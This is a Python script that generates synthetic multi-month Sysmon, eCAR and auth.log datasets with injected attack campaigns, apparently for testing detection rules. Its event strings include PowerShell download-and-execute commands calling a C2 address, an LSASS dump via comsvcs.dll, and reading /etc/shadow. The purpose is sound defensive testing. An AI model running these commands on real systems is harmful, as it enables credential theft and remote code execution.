#!/usr/bin/env python3
"""Generate a multi-month synthetic ARIS evaluation dataset.

Spans configurable date ranges with recurring attack campaigns
injected on randomized schedules. Covers all 10 Sigma rules
across Sysmon JSONL, OpTC eCAR, and Linux auth.log.

Usage:
    python -m scripts.generate_dataset --output-dir ./dataset --start 2024-01-01 --end 2024-03-31 --target-gb 4
    python -m scripts.generate_dataset --output-dir ./dataset --start 2024-01-01 --end 2024-01-07 --target-gb 0.1
    python -m scripts.generate_dataset --output-dir ./dataset --start 2024-01-01 --end 2024-06-30 --target-gb 10

Output:
    dataset/
      ecar/YYYY-MM-DD.json.gz
      sysmon/YYYY-MM-DD.jsonl.gz
      authlog/YYYY-MM-DD.log.gz
      ground_truth.json
      manifest.json
"""
from __future__ import annotations
import argparse, gzip, json, math, random, time
from datetime import datetime, timedelta, timezone
from pathlib import Path

NUM_WIN=500; NUM_LIN=50
WIN_HOSTS=[f"SysClient{i:04d}" for i in range(1,NUM_WIN+1)]
LIN_HOSTS=[f"srv-{i:02d}" for i in range(1,NUM_LIN+1)]

CAMPAIGN_TEMPLATES=[
    {"name":"PSEmpire Spearphish","days":1,"fmts":["sysmon","ecar"],
     "techs":["T1059.001","T1033","T1082","T1547.001","T1105"]},
    {"name":"Lateral + CredDump","days":2,"fmts":["ecar"],
     "techs":["T1021.001","T1059.001","T1003.001"]},
    {"name":"Obfuscated Payload","days":1,"fmts":["sysmon","ecar"],
     "techs":["T1059.001","T1027","T1547.001"]},
    {"name":"SSH BruteForce + Shadow","days":1,"fmts":["authlog"],
     "techs":["T1110.001","T1003.008"]},
    {"name":"Full Kill Chain","days":3,"fmts":["sysmon","ecar","authlog"],
     "techs":["T1059.001","T1033","T1082","T1547.001","T1105",
              "T1021.001","T1003.001","T1027","T1110.001","T1003.008"]},
]

WIN_PROCS=[
    ("C:\\Windows\\System32\\svchost.exe","svchost.exe -k netsvcs"),
    ("C:\\Windows\\System32\\svchost.exe","svchost.exe -k DcomLaunch"),
    ("C:\\Windows\\System32\\csrss.exe","csrss.exe"),
    ("C:\\Windows\\System32\\lsass.exe","lsass.exe"),
    ("C:\\Windows\\System32\\services.exe","services.exe"),
    ("C:\\Windows\\System32\\dwm.exe","dwm.exe"),
    ("C:\\Windows\\System32\\spoolsv.exe","spoolsv.exe"),
    ("C:\\Windows\\System32\\SearchIndexer.exe","SearchIndexer.exe /Embedding"),
    ("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","WmiPrvSE.exe"),
    ("C:\\Windows\\System32\\conhost.exe","conhost.exe 0xFFFFFFFF"),
    ("C:\\Windows\\System32\\dllhost.exe","dllhost.exe /Processid:{02D4B3F1}"),
    ("C:\\Windows\\System32\\TrustedInstaller.exe","TrustedInstaller.exe"),
    ("C:\\Windows\\explorer.exe","explorer.exe"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","chrome.exe --type=renderer"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","OUTLOOK.EXE"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","WINWORD.EXE"),
    ("C:\\Windows\\System32\\notepad.exe","notepad.exe"),
    ("C:\\Windows\\System32\\taskmgr.exe","taskmgr.exe"),
    ("C:\\Windows\\System32\\RuntimeBroker.exe","RuntimeBroker.exe -Embedding"),
    ("C:\\Windows\\System32\\cmd.exe","cmd.exe /c echo test"),
    ("C:\\Windows\\System32\\net.exe","net time"),
    ("C:\\Windows\\System32\\ipconfig.exe","ipconfig"),
]
BENIGN_REG=["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"]
BENIGN_DLLS=["C:\\Windows\\System32\\ntdll.dll","C:\\Windows\\System32\\kernel32.dll",
    "C:\\Windows\\System32\\user32.dll","C:\\Windows\\System32\\advapi32.dll",
    "C:\\Windows\\System32\\msvcrt.dll","C:\\Windows\\System32\\ole32.dll"]
WIN_USERS=["CORP\\user01","CORP\\user02","CORP\\user03","CORP\\user04",
    "CORP\\admin","CORP\\svc_backup","NT AUTHORITY\\SYSTEM","NT AUTHORITY\\LOCAL SERVICE"]
BENIGN_IPS=["10.10.1.1","10.10.1.50","172.16.0.1","8.8.8.8","13.107.42.14","142.250.80.46"]
BENIGN_PORTS=[80,443,53,445,135,389,8080]
LIN_VALID=["alice","bob","deploy","jenkins","ubuntu"]
LIN_INVALID=["root","admin","test","guest","oracle","postgres"]
LIN_ATTACKER_IPS=["10.0.0.50","10.0.0.60","10.0.0.77","192.168.5.99"]
MONTHS_S=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]
PS="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
C2="192.168.1.10"

_C=0
def _aid():
    global _C; _C+=1; return f"p-{_C:012x}"
def _ns(dt):
    return int(dt.replace(tzinfo=timezone.utc).timestamp()*1_000_000_000)

# -- Sysmon builders --
def _sp(ts,h,u,img,cmd,par):
    return json.dumps({"EventID":1,"UtcTime":ts.strftime("%Y-%m-%d %H:%M:%S.")+f"{ts.microsecond//1000:03d}","Computer":h,"User":u,"Image":img,"CommandLine":cmd,"ParentImage":par},separators=(",",":"))
def _sr(ts,h,u,img,cmd,tgt,det=""):
    return json.dumps({"EventID":13,"UtcTime":ts.strftime("%Y-%m-%d %H:%M:%S.")+f"{ts.microsecond//1000:03d}","Computer":h,"User":u,"Image":img,"CommandLine":cmd,"TargetObject":tgt,"Details":det},separators=(",",":"))
def _sn(ts,h,u,img,dip,dp,sip):
    return json.dumps({"EventID":3,"UtcTime":ts.strftime("%Y-%m-%d %H:%M:%S.")+f"{ts.microsecond//1000:03d}","Computer":h,"User":u,"Image":img,"DestinationIp":dip,"DestinationPort":str(dp),"SourceIp":sip},separators=(",",":"))
def sb(ts,h,rng):
    u=rng.choice(WIN_USERS);r=rng.random()
    if r<.40:i,c=rng.choice(WIN_PROCS);return _sp(ts,h,u,i,c,rng.choice(WIN_PROCS)[0])
    elif r<.55:k=rng.choice(BENIGN_REG);return _sr(ts,h,u,"C:\\Windows\\regedit.exe",f"reg query {k}",k)
    elif r<.70:return _sn(ts,h,u,rng.choice(WIN_PROCS)[0],rng.choice(BENIGN_IPS),rng.choice(BENIGN_PORTS),f"10.10.1.{rng.randint(1,254)}")
    else:i,c=rng.choice(WIN_PROCS);return _sp(ts,h,u,i,c,"C:\\Windows\\services.exe")

# -- eCAR builders --
def _ep(ts,h,u,img,cmd,par):
    return json.dumps({"actorID":_aid(),"object":"PROCESS","action":"CREATE","timestamp":_ns(ts),"hostname":h,"properties":{"image_path":img,"command_line":cmd,"parent_image_path":par,"user":u}},separators=(",",":"))
def _er(ts,h,u,k,d):
    return json.dumps({"actorID":_aid(),"object":"REGISTRY","action":"WRITE","timestamp":_ns(ts),"hostname":h,"properties":{"key":k,"data":d,"user":u}},separators=(",",":"))
def _ef(ts,h,u,dip,dp,lip):
    return json.dumps({"actorID":_aid(),"object":"FLOW","action":"START","timestamp":_ns(ts),"hostname":h,"properties":{"dest_ip":dip,"dest_port":str(dp),"local_ip":lip,"user":u}},separators=(",",":"))
def _efi(ts,h,u,p):
    return json.dumps({"actorID":_aid(),"object":"FILE","action":"CREATE","timestamp":_ns(ts),"hostname":h,"properties":{"file_path":p,"user":u}},separators=(",",":"))
def _em(ts,h,u,dll):
    return json.dumps({"actorID":_aid(),"object":"MODULE","action":"LOAD","timestamp":_ns(ts),"hostname":h,"properties":{"image_path":dll,"user":u}},separators=(",",":"))
def _err(ts,h,u,k):
    return json.dumps({"actorID":_aid(),"object":"REGISTRY","action":"READ","timestamp":_ns(ts),"hostname":h,"properties":{"key":k,"user":u}},separators=(",",":"))
def eb(ts,h,rng):
    u=rng.choice(WIN_USERS);r=rng.random()
    if r<.35:i,c=rng.choice(WIN_PROCS);return _ep(ts,h,u,i,c,rng.choice(WIN_PROCS)[0])
    elif r<.50:return _err(ts,h,u,rng.choice(BENIGN_REG))
    elif r<.60:return _ef(ts,h,u,rng.choice(BENIGN_IPS),rng.choice(BENIGN_PORTS),f"10.10.1.{rng.randint(1,254)}")
    elif r<.75:return _efi(ts,h,u,f"C:\\Users\\{u.split(chr(92))[-1]}\\file_{rng.randint(1,9999)}.tmp")
    elif r<.90:return _em(ts,h,u,rng.choice(BENIGN_DLLS))
    else:return _er(ts,h,u,rng.choice(BENIGN_REG),rng.choice(["0","1"]))

# -- authlog builders --
def _al(ts,h,msg):
    return f"{MONTHS_S[ts.month-1]} {ts.day:2d} {ts.strftime('%H:%M:%S')} {h} {msg}"
def ab(ts,h,rng):
    u=rng.choice(LIN_VALID);pid=rng.randint(1000,30000);r=rng.random()
    if r<.20:return _al(ts,h,f"sshd[{pid}]: Accepted publickey for {u} from 10.0.0.{rng.randint(1,30)} port {rng.randint(40000,65000)} ssh2")
    elif r<.40:return _al(ts,h,f"sshd[{pid}]: pam_unix(sshd:session): session opened for user {u}")
    elif r<.55:return _al(ts,h,f"sshd[{pid}]: pam_unix(sshd:session): session closed for user {u}")
    elif r<.70:return _al(ts,h,f"cron[{pid}]: pam_unix(cron:session): session opened for user root")
    elif r<.85:return _al(ts,h,f"systemd-logind[{rng.randint(100,999)}]: New session {rng.randint(1,999)} of user {u}")
    else:return _al(ts,h,f"sshd[{pid}]: Connection closed by 10.0.0.{rng.randint(1,30)} port {rng.randint(40000,65000)}")

# -- Malicious event generators per technique --
def gen_mal(fmt,tech,ts,host,rng):
    u="CORP\\user01";lines=[];gt=[]
    if tech=="T1059.001":
        v=[f"powershell.exe -w hidden -enc SQBFAFgPayload{rng.randint(100,999)}",
           f"powershell.exe -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{C2}/s')",
           f"powershell.exe -EncodedCommand JABjAGxPayload{rng.randint(100,999)}"]
        cmd=rng.choice(v);par=rng.choice(["C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","C:\\Windows\\System32\\cmd.exe","C:\\Windows\\explorer.exe"])
        if fmt=="sysmon":lines.append(_sp(ts,host,u,PS,cmd,par))
        elif fmt=="ecar":lines.append(_ep(ts,host,u,PS,cmd,par))
    elif tech=="T1033":
        cmd=rng.choice(["whoami /all","whoami /priv","whoami"])
        if fmt=="sysmon":lines.append(_sp(ts,host,u,"C:\\Windows\\System32\\whoami.exe",cmd,PS))
        elif fmt=="ecar":lines.append(_ep(ts,host,u,"C:\\Windows\\System32\\whoami.exe",cmd,PS))
    elif tech=="T1082":
        if fmt=="sysmon":lines.append(_sp(ts,host,u,"C:\\Windows\\System32\\systeminfo.exe","systeminfo",PS))
        elif fmt=="ecar":lines.append(_ep(ts,host,u,"C:\\Windows\\System32\\systeminfo.exe","systeminfo",PS))
    elif tech=="T1547.001":
        k=rng.choice(["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcHelper",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\SecurityUpdate"])
        p=f"C:\\Temp\\payload_{rng.randint(1,999)}.exe"
        if fmt=="sysmon":lines.append(_sr(ts,host,u,"C:\\Windows\\System32\\reg.exe",f"reg add {k} /d {p}",k,p))
        elif fmt=="ecar":lines.append(_er(ts,host,u,k,p))
    elif tech=="T1105":
        cmd=f"powershell.exe -nop IEX(New-Object Net.WebClient).DownloadString('http://{C2}:{rng.choice([8080,8443])}/tool')"
        if fmt=="sysmon":lines.append(_sp(ts,host,u,PS,cmd,"C:\\Windows\\System32\\cmd.exe"))
        elif fmt=="ecar":
            lines.append(_ep(ts,host,u,PS,cmd,"C:\\Windows\\System32\\cmd.exe"))
            lines.append(_efi(ts+timedelta(seconds=rng.randint(5,20)),host,u,"C:\\Users\\user01\\AppData\\Local\\Temp\\nc.exe"))
    elif tech=="T1021.001":
        if fmt=="ecar":lines.append(_ef(ts,host,"CORP\\admin","10.10.1.201","3389",f"10.10.1.{rng.randint(1,254)}"))
    elif tech=="T1003.001":
        if fmt=="ecar":
            cmd=f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {rng.randint(400,800)} C:\\Temp\\lsass.dmp full"
            lines.append(_ep(ts,host,"CORP\\admin","C:\\Windows\\System32\\rundll32.exe",cmd,PS))
    elif tech=="T1027":
        cmd=f"powershell.exe -w hidden -enc JABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwP{rng.randint(10,99)}"
        par="C:\\Windows\\System32\\mshta.exe"
        if fmt=="sysmon":lines.append(_sp(ts,host,u,PS,cmd,par))
        elif fmt=="ecar":lines.append(_ep(ts,host,u,PS,cmd,par))
    elif tech=="T1110.001":
        if fmt=="authlog":
            ip=rng.choice(LIN_ATTACKER_IPS);tgt=rng.choice(LIN_INVALID);n=rng.randint(8,25)
            for i in range(n):
                t2=ts+timedelta(seconds=i*rng.randint(1,4))
                lines.append(_al(t2,host,f"sshd[{rng.randint(1000,30000)}]: Failed password for {tgt} from {ip} port {rng.randint(40000,65000)} ssh2"))
            return lines,[{"technique":tech}]*len(lines)
    elif tech=="T1003.008":
        if fmt=="authlog":
            lines.append(_al(ts,host,f"sudo[{rng.randint(1000,30000)}]: {rng.choice(LIN_VALID)} : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/cat /etc/shadow"))
    if lines:gt=[{"technique":tech}]*len(lines)
    return lines,gt

# -- Campaign scheduler --
def schedule(start,end,rng,density=0.08):
    camps=[];cur=start
    while cur<=end:
        if rng.random()<density:
            t=rng.choice(CAMPAIGN_TEMPLATES)
            camps.append({"name":t["name"],"start":cur,"days":t["days"],"fmts":t["fmts"],
                "techs":t["techs"],"win":rng.sample(WIN_HOSTS,min(rng.randint(1,3),NUM_WIN)),
                "lin":rng.sample(LIN_HOSTS,min(rng.randint(1,2),NUM_LIN)),"hour":rng.randint(9,15)})
            cur+=timedelta(days=t["days"]+rng.randint(1,3))
        else:cur+=timedelta(days=1)
    return camps

def attacks_for_day(camps,date,fmt):
    abm={};gts=[];lr=random.Random(hash((date.isoformat(),fmt)))
    for c in camps:
        ce=c["start"]+timedelta(days=c["days"]-1)
        if not(c["start"]<=date<=ce):continue
        if fmt not in c["fmts"]:continue
        hosts=c["win"] if fmt in("sysmon","ecar") else c["lin"]
        for host in hosts:
            t=datetime(date.year,date.month,date.day,c["hour"],0,0)+timedelta(minutes=lr.randint(5,30))
            for tech in c["techs"]:
                skip=False
                if tech in("T1110.001","T1003.008") and fmt!="authlog":skip=True
                if tech in("T1021.001","T1003.001") and fmt!="ecar":skip=True
                if tech in("T1033","T1082","T1547.001","T1059.001","T1105","T1027") and fmt=="authlog":skip=True
                if skip:continue
                ls,gs=gen_mal(fmt,tech,t,host,lr)
                mo=t.hour*60+t.minute-360
                mo=max(0,min(959,mo))
                for l in ls:abm.setdefault(mo,[]).append(l)
                for g in gs:
                    g.update({"host":host,"date":date.isoformat(),"campaign":c["name"],"format":fmt,"timestamp":t.isoformat()})
                    gts.append(g)
                t+=timedelta(minutes=lr.randint(3,20))
                if tech in("T1059.001","T1547.001") and fmt in("sysmon","ecar"):
                    for _ in range(lr.randint(2,5)):
                        t+=timedelta(minutes=lr.randint(10,40))
                        m=max(0,min(959,t.hour*60+t.minute-360))
                        if fmt=="sysmon":abm.setdefault(m,[]).append(_sn(t,host,"CORP\\user01",PS,C2,"443",f"10.10.1.{lr.randint(1,254)}"))
                        else:abm.setdefault(m,[]).append(_ef(t,host,"CORP\\user01",C2,"443",f"10.10.1.{lr.randint(1,254)}"))
    return abm,gts

# -- Day writer --
def write_day(date,fmt,target,rng,path,hosts,bfn,camps):
    TM=960
    abm,gts=attacks_for_day(camps,date,fmt)
    mc=sum(len(v) for v in abm.values())
    bt=max(0,target-mc)
    wt=[max(.05,math.exp(-.5*((m/60-8)/2.5)**2)) for m in range(TM)]
    tw=sum(wt)
    epm=[max(1,int(bt*wt[m]/tw)) for m in range(TM)]
    d=bt-sum(epm)
    for _ in range(abs(d)):epm[rng.randint(TM//4,3*TM//4)]+=1 if d>0 else -1
    w=0
    with gzip.open(path,"wt",encoding="utf-8",compresslevel=6) as f:
        for minute in range(TM):
            base=datetime(date.year,date.month,date.day,6)+timedelta(minutes=minute)
            buf=[]
            for _ in range(max(0,epm[minute])):
                ts=base+timedelta(seconds=rng.randint(0,59),milliseconds=rng.randint(0,999))
                buf.append(bfn(ts,rng.choice(hosts),rng))
            if minute in abm:buf.extend(abm[minute])
            rng.shuffle(buf)
            for l in buf:f.write(l);f.write("\n");w+=1
    return w,mc,gts

# -- Main --
def main():
    ap=argparse.ArgumentParser(description="Multi-month ARIS dataset generator")
    ap.add_argument("--output-dir",required=True)
    ap.add_argument("--start",required=True,help="YYYY-MM-DD")
    ap.add_argument("--end",required=True,help="YYYY-MM-DD")
    ap.add_argument("--target-gb",type=float,default=4.0)
    ap.add_argument("--seed",type=int,default=2024)
    ap.add_argument("--density",type=float,default=0.08,help="Attack probability per day (0.08=~1 per 12 days)")
    args=ap.parse_args()

    rng=random.Random(args.seed);out=Path(args.output_dir)
    start=datetime.strptime(args.start,"%Y-%m-%d")
    end=datetime.strptime(args.end,"%Y-%m-%d")
    td=(end-start).days+1

    epd=int(args.target_gb*1024**3/200/td)
    ecar_pd=int(epd*.60);sysmon_pd=int(epd*.30);authlog_pd=int(epd*.10)

    camps=schedule(start,end,rng,args.density)

    print(f"ARIS Multi-Month Dataset Generator")
    print(f"  Range: {args.start} to {args.end} ({td} days)")
    print(f"  Target: {args.target_gb:.1f} GB compressed")
    print(f"  Events/day: {ecar_pd:,} eCAR + {sysmon_pd:,} Sysmon + {authlog_pd:,} authlog")
    print(f"  Campaigns: {len(camps)}")
    for c in camps:
        print(f"    {c['start'].strftime('%Y-%m-%d')} [{c['days']}d] {c['name']}")
    print()

    for d in ["ecar","sysmon","authlog"]:(out/d).mkdir(parents=True,exist_ok=True)

    all_gt=[];tw=0;tm=0;t0=time.time();cur=start
    while cur<=end:
        ds=cur.strftime("%Y-%m-%d");dw=0;dm=0
        for fmt,n,hosts,bfn,ext in [("ecar",ecar_pd,WIN_HOSTS,eb,"json.gz"),("sysmon",sysmon_pd,WIN_HOSTS,sb,"jsonl.gz"),("authlog",authlog_pd,LIN_HOSTS,ab,"log.gz")]:
            w,m,gt=write_day(cur,fmt,n,rng,out/fmt/f"{ds}.{ext}",hosts,bfn,camps)
            dw+=w;dm+=m;all_gt.extend(gt)
        tw+=dw;tm+=dm
        el=time.time()-t0;rate=tw/el if el>0 else 0
        pct=(cur-start).days/td*100
        tag=" *ATTACK*" if dm>0 else ""
        print(f"\r  [{pct:5.1f}%] {ds}: {dw:,} events ({dm} mal){tag}  [{rate:,.0f} ev/s]",end="",flush=True)
        if dm>0:print()
        cur+=timedelta(days=1)

    print()
    with open(out/"ground_truth.json","w") as f:
        json.dump({"description":"Synthetic ARIS evaluation ground truth",
            "range":f"{args.start} to {args.end}","seed":args.seed,
            "campaigns":[{"name":c["name"],"start":c["start"].isoformat(),"days":c["days"],"techniques":c["techs"]} for c in camps],
            "techniques_covered":sorted(set(e["technique"] for e in all_gt)),
            "total_malicious":len(all_gt),"events":all_gt},f,indent=2)

    tsz=sum(f.stat().st_size for f in out.rglob("*.gz"))
    with open(out/"manifest.json","w") as f:
        json.dump({"range":f"{args.start} to {args.end}","days":td,"seed":args.seed,
            "density":args.density,"total_events":tw,"total_malicious":tm,
            "ratio":f"{tm/max(1,tw)*100:.4f}%","compressed_gb":round(tsz/1024**3,3),
            "campaigns":len(camps),
            "rules":["aris_r_0001(T1033)","aris_r_0002(T1547.001)","aris_r_0003(T1059.001)",
                "aris_r_0004(T1110.001)","aris_r_0005(T1003.008)","aris_r_0006(T1082)",
                "aris_r_0007(T1021.001)","aris_r_0008(T1003.001)","aris_r_0009(T1105)","aris_r_0010(T1027)"]},f,indent=2)

    el=time.time()-t0
    print(f"\nDone in {el:.0f}s")
    print(f"  Compressed: {tsz/1024**3:.2f} GB")
    print(f"  Events: {tw:,}")
    print(f"  Malicious: {tm:,} ({tm/max(1,tw)*100:.4f}%)")
    print(f"  Campaigns: {len(camps)}")
    print(f"  Techniques: {sorted(set(e['technique'] for e in all_gt))}")
    print(f"  Output: {out}")

if __name__=="__main__":
    main()
